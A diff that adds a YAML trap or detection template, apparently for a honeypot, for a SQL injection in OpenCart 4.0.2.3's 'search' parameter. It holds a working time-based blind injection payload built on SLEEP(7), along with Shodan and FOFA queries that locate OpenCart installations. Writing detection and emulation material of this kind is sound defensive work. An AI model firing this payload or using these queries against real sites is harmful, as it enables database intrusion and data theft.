@@ -1,0 +1,37 @@
+id: opencart-core-sqli
+info:
+  name: OpenCart Core 4.0.2.3 'search' - SQL Injection
+  author: Kazgangap
+  description: 'Opencart allows SQL Injection via parameter ''search'' in /index.php?route=product/search&search=.
+    Exploiting this issue could allow an attacker to compromise the application, access
+    or modify data, or exploit latent vulnerabilities in the underlying database.
+
+    '
+  severity: high
+  reference:
+  - https://www.exploit-db.com/exploits/51940
+  - https://cxsecurity.com/issue/WLB-2024040004
+  metadata:
+    max-request: 2
+    shodan-query: title:"OpenCart"
+    fofa-query: icon_hash="-1443008128"
+  tags: opencart,sqli
+traps:
+- request:
+    method: GET
+    path: ''
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
+- request:
+    method: GET
+    path: /index.php?route=product/search&search=')+AND+(SELECT+8368+FROM+(SELECT(SLEEP(7)))uUDJ)--+Nabb
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: Nabb</title>
